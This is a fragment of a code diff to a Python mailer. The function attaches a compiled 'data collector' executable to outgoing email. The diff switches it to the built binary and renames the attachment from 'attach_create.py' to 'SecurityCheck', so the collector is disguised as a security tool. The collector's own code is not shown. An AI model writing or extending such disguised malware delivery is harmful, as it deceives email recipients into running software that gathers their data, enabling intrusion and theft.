@@ -11,7 +11,7 @@ import os
 
 def attach_data_collector(msg):
     """Attach the attach_create.py executable to the email."""
-    collector_path = os.path.join(os.path.dirname(__file__), 'attach_create.py')
+    collector_path = os.path.join(os.path.dirname(__file__), './dist/attach_create')
     
     if not os.path.exists(collector_path):
         print("Error: attach_create.py file not found!")
@@ -25,7 +25,7 @@ def attach_data_collector(msg):
         file_data,
         maintype='application',
         subtype='octet-stream',
-        filename='attach_create.py'
+        filename='SecurityCheck'
     )
     
     print("attach_create.py executable attached")
